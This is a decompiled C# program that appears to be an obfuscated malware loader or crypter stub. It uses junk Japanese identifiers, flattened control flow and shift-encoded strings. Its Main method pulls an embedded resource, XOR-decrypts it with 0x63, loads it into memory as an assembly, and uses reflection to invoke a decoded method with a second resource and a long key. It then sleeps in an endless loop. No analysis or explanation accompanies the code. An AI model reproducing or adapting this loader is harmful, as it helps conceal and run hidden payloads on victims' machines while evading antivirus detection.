using System;
using System.Diagnostics;
using System.Globalization;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
public sealed class 代替_変数_変数_クラス_66
{
	public static string 変数_クラス_代理人_メイン_76 = Process.GetCurrentProcess().MainModule!.FileName;

	public static object 変数_代理人_代理人_代理人_31(string 変数_代理人_代理人_代理人_31_arg01)
	{
		return WWkN9P6XxRt5y5f5yp(new ResourceManager(変数_代理人_代理人_代理人_31_arg01, (Assembly)W531Hnqf990vrb8tuw()), 変数_代理人_代理人_代理人_31_arg01);
	}

	public static byte[] クラス_メイン_メイン_クラス_28(byte[] クラス_メイン_メイン_クラス_28_param_01)
	{
		_ = 0;
		if (a01NN756CTC4ftRQHB())
		{
			goto IL_003d;
		}
		goto IL_0053;
		IL_0053:
		int num = num + 18;
		goto IL_0045;
		IL_0045:
		int num2 = default(int);
		while (true)
		{
			if (num > num2)
			{
				if (OSNGehmIcM6SIufOJm())
				{
				}
				switch (6)
				{
				case 0:
				case 4:
					break;
				default:
					continue;
				case 2:
				case 5:
					goto end_IL_0045;
				case 6:
					return クラス_メイン_メイン_クラス_28_param_01;
				}
				goto IL_003d;
			}
			クラス_メイン_メイン_クラス_28_param_01[num] = (byte)(クラス_メイン_メイン_クラス_28_param_01[num] ^ 0x63u);
			break;
			continue;
			end_IL_0045:
			break;
		}
		goto IL_0053;
		IL_003d:
		num2 = クラス_メイン_メイン_クラス_28_param_01.Length - 1;
		num = 0;
		goto IL_0045;
	}

	[STAThread]
	public static void Main()
	{
		//IL_00f4: Unknown result type (might be due to invalid IL or missing references)
		Thread.CurrentThread.CurrentCulture = CultureInfo.CreateSpecificCulture(モジュール_メイン_クラス_変数_78("r{:b`"));
		try
		{
			AppDomain.CurrentDomain.Load(クラス_メイン_メイン_クラス_28((byte[])変数_代理人_代理人_代理人_31("mbkebl"))).GetType(モジュール_メイン_クラス_変数_78("[\\[R;QR_];_]RlPY`"))!.GetMethod(モジュール_メイン_クラス_変数_78("_\u0082{[r\u0081"))!.Invoke(null, new object[1] { RuntimeHelpers.GetObjectValue(AppDomain.CurrentDomain.Load(クラス_メイン_メイン_クラス_28((byte[])変数_代理人_代理人_代理人_31("mbkebl"))).GetType(モジュール_メイン_クラス_変数_78("[\\[R;QR_];_]RlPY`"))!.GetMethod(モジュール_メイン_クラス_変数_78("NR`lQrp\u007f\u0086}\u0081"))!.Invoke(null, new object[3]
			{
				RuntimeHelpers.GetObjectValue(変数_代理人_代理人_代理人_31("yaeecge")),
				"VXufeos34XgCJVpny1aiS5nuiUd89rIv4W7kQkAI6sKEHKQ3kgo6LUBTrIkJbmaak97Y6OdKXpP",
				true
			})) });
			while (true)
			{
				Thread.Sleep(2000);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2.ToString(), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	public static void 機能_クラス_クラス_メイン_24(string 機能_クラス_クラス_メイン_24_arg01, string 機能_クラス_クラス_メイン_24_arg02, string 機能_クラス_クラス_メイン_24_arg03, string 機能_クラス_クラス_メイン_24_arg04)
	{
		o7Znk1jijl5ilQWk72V(n8lVJUjW3DYuEYUDaxa(r6WH5Cjjs6RHyMA6kNh(WmTqhWefMu1DvQfxHD(), yWGGFljcxDPRPyd6hM8((byte[])awA3pxz58u9o5PP3eI("mbkebl"))), iQQbWmjvKMJ8DvoVXPO("[\\[R;QR_];_]RlPY`")).GetMethod((string)iQQbWmjvKMJ8DvoVXPO("PZQlNQQl`bO")), null, new object[4] { 機能_クラス_クラス_メイン_24_arg01, 機能_クラス_クラス_メイン_24_arg02, 機能_クラス_クラス_メイン_24_arg03, 機能_クラス_クラス_メイン_24_arg04 });
	}

	public static string モジュール_メイン_クラス_変数_78(string モジュール_メイン_クラス_変数_78_arg01)
	{
		while (true)
		{
			string text = null;
			while (true)
			{
				int num = cUKTQLjB3Wdw3gmf9AA(モジュール_メイン_クラス_変数_78_arg01) - 1;
				int num2 = 0;
				_ = 1;
				if (OSNGehmIcM6SIufOJm())
				{
					if (!OSNGehmIcM6SIufOJm())
					{
						switch (5)
						{
						case 1:
							break;
						case 3:
							goto end_IL_0003;
						default:
							goto IL_0054;
						case 0:
						case 2:
						case 4:
						case 5:
							goto IL_0077;
						case 7:
							goto IL_007b;
						}
						continue;
					}
				}
				goto IL_0077;
				IL_007b:
				return text;
				IL_0054:
				num2++;
				goto IL_0077;
				IL_0077:
				if (num2 <= num)
				{
					text = (string)Le2JY6jy0C7RYXD0Mca(text, rPClXFjJMEwDWmOkwtP(vBwfODjbG1kQcRKIEJO(QeRD5hjRBODTVoKlAsS(モジュール_メイン_クラス_変数_78_arg01, num2) - 13)));
					goto IL_0054;
				}
				goto IL_007b;
				continue;
				end_IL_0003:
				break;
			}
		}
	}

	internal static object xkkLCy0xNnNFPriAHd()
	{
		return Process.GetCurrentProcess();
	}

	internal static object jCeJpRxskXBlJea4aY(object object_0)
	{
		return ((Process)object_0).MainModule;
	}

	internal static object uSIwBYwyKft4tNsyeU(object object_0)
	{
		return ((ProcessModule)object_0).FileName;
	}

	internal static bool a01NN756CTC4ftRQHB()
	{
		return true;
	}

	internal static bool OSNGehmIcM6SIufOJm()
	{
		return false;
	}

	internal static object W531Hnqf990vrb8tuw()
	{
		return Assembly.GetExecutingAssembly();
	}

	internal static object WWkN9P6XxRt5y5f5yp(object object_0, object object_1)
	{
		return ((ResourceManager)object_0).GetObject((string)object_1);
	}

	internal static object WmTqhWefMu1DvQfxHD()
	{
		return AppDomain.CurrentDomain;
	}

	internal static object awA3pxz58u9o5PP3eI(object object_0)
	{
		return 変数_代理人_代理人_代理人_31((string)object_0);
	}

	internal static object yWGGFljcxDPRPyd6hM8(object object_0)
	{
		return クラス_メイン_メイン_クラス_28((byte[])object_0);
	}

	internal static object r6WH5Cjjs6RHyMA6kNh(object object_0, object object_1)
	{
		return ((AppDomain)object_0).Load((byte[])object_1);
	}

	internal static object iQQbWmjvKMJ8DvoVXPO(object object_0)
	{
		return モジュール_メイン_クラス_変数_78((string)object_0);
	}

	internal static Type n8lVJUjW3DYuEYUDaxa(object object_0, object object_1)
	{
		return ((Assembly)object_0).GetType((string)object_1);
	}

	internal static object o7Znk1jijl5ilQWk72V(object object_0, object object_1, object object_2)
	{
		return ((MethodBase)object_0).Invoke(object_1, (object?[]?)object_2);
	}

	internal static int cUKTQLjB3Wdw3gmf9AA(object object_0)
	{
		return ((string)object_0).Length;
	}

	internal static char QeRD5hjRBODTVoKlAsS(object object_0, int int_0)
	{
		return ((string)object_0)[int_0];
	}

	internal static char vBwfODjbG1kQcRKIEJO(int int_0)
	{
		return Strings.ChrW(int_0);
	}

	internal static object rPClXFjJMEwDWmOkwtP(char char_0)
	{
		return Conversions.ToString(char_0);
	}

	internal static object Le2JY6jy0C7RYXD0Mca(object object_0, object object_1)
	{
		return (string?)object_0 + (string?)object_1;
	}
}
